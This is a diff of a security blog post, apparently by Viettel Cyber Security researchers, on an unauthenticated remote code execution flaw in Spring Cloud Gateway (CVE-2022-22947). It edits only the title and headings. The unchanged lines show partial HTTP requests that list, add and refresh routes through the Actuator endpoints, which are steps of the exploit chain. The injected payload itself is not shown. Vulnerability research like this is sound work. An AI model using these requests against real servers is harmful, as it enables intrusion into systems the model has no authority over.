@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "Spring Gateway Unauth RCE"
+title:  "[CVE-2022-22947] Spring Gateway Unauth RCE"
 date:   2022-01-18 21:11:53 +0700
 author: hoangnx99, rskvp93 (from Viettel Cyber Security)
 categories: jekyll update
@@ -36,7 +36,7 @@ There is a list of public endpoint `/actuator` that can help us to construct a r
 ![](/assets/spring-gateway/actuator-gateway-endpoints.png)
 
 As the analysis of the above blog, we will summary some promising endpoints:
-### 1. List all route:
+### 2.1. List all route:
 
 ```
 GET /actuator/gateway/routes HTTP/1.1
@@ -48,7 +48,7 @@ Connection: close
 
 ![List Route](/assets/spring-gateway/list-routes.png)
 
-### 2. Add a route:
+### 2.2. Add a route:
 
 ```
 POST /actuator/gateway/routes/test HTTP/1.1
@@ -81,7 +81,7 @@ Content-Length: 334
 ```
 
 ![List Route](/assets/spring-gateway/new-route.png)
-### 3. Refresh route:
+### 2.3. Refresh route:
 After adding a route, all the new route need a subsequent request to make the application recognize.
 
 ```
